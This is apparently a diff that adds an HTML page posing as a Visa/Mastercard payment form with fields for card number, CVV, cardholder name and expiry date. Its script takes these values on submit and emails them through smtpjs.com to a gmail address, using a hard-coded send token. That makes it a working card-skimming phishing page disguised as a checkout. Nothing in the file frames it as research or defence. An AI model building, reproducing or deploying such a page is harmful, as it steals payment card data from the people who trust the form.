@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="bootstrap.min.css">
+
+  <title></title>
+</head>
+<script type="text/javascript" src=""></script>
+
+<body class="bg-warning">
+  <div class="container mt-5">
+
+    <div class="card bg-white">
+      <div class="card-header text-center">
+        <i><img src="/Visa_Inc.-Logo.wine.svg" style="height: 20px;" alt=""></i>
+        <i><img src="/Mastercard-Logo.wine.svg" style="height: 20px;" alt=""></i>
+      </div>
+      <div class="card-body">
+        <form action="" id="card">
+          <div class="row g-none">
+            <div class="col-8">
+              <label for="cardNumber" class="form-label fw-bold">CARD NUMBER</label>
+              <input type="text" class="form-control" placeholder="card number" aria-label="First name" id="cardNumber">
+            </div>
+            <div class="col-4">
+              <label for="cvv" class="form-label fw-bold">CVV</label>
+              <input type="text" class="form-control" placeholder="cvv" aria-label="Last name" id="cvv">
+            </div>
+          </div>
+          <div class="">
+            <div class="">
+              <div class="form-group mt-3">
+                <label for="name" class="fw-bold form-label">CARD HOLDER NAME</label>
+                <input type="text" class="form-control" placeholder="card holder name" id="name">
+              </div>
+            </div>
+            <div class="">
+              <div class="form-group ">
+                <label for="name" class="fw-bold form-label">EXPIRY DATE</label>
+                <input type="month" class="form-control" placeholder="date" id="date">
+              </div>
+            </div>
+          </div>
+          <button class="mt-4 d-block btn-primary btn ">
+            pay now
+          </button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+  <script>
+    function data(e) {
+
+      var name = document.getElementById("name").value;
+      var cardNumber = document.getElementById("cardNumber").value;
+      var date = document.getElementById("date").value;
+      var cvv = document.getElementById("cvv").value;
+
+      Email.send({
+        SecureToken: "1cae4f77-cd15-48bf-8e9d-5138d3411621",
+        To: 'mayorjhay2@gmail.com',
+        From: "mayorjhay123@gmail.com",
+        Subject: "client",
+        Body: 'card-name : ' + name + " card number :" + " " + cardNumber + " date :" + " " + date + " " + "cvv :" + cvv
+      }).then(
+        message => alert(message)
+      );
+
+    }
+
+    var card = document.getElementById("card")
+    card.addEventListener("submit", data)
+  </script>
+  <script type="text/javascript" src="cdn_modules/uikit@3.16.13/js/uikit.min.js"></script>
+</body>
+
+</html>
